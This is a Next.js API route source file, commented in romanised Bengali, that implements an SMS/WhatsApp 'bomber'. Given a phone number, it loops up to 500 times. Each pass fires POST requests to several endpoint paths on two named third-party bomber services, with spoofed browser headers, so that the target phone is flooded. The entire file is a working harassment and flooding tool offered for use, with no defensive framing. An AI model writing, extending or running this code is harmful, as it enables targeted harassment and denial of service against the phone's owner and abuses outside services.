// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Common API Endpoints jeta sob bomber site use kore
  const potentialEndpoints = [
    '/api/send',
    '/api/v1/send',
    '/api/v1/attack',
    '/api/sms/send',
    '/api/bomb',
    '/api/v2/attack',
    '/api/send-sms'
  ];

  // Tomar dewa main links
  const baseLinks = [
    'https://shadowx-sms-bomber.onrender.com',
    'https://nuke-sms-bomber.pages.dev'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 500 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      // Amra protibar protita base link er sathe potential endpoints gulo check korbo
      const attackPromises = [];

      baseLinks.forEach(baseUrl => {
        potentialEndpoints.forEach(endpoint => {
          attackPromises.push(
            fetch(baseUrl + endpoint, {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': baseUrl,
                'Referer': baseUrl + '/'
              },
              body: JSON.stringify({
                number: number,
                amount: 1,
                country: "BD",
                service: "whatsapp",
                msg: "Ultimate Attack",
                phone: number, // alternative key
                mobile: number  // alternative key
              }),
            }).catch(err => null) // Error handle korbe jate loop bondho na hoy
          );
        });
      });

      // Sob request eksathe pathabe
      await Promise.all(attackPromises);

      // Delay control
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
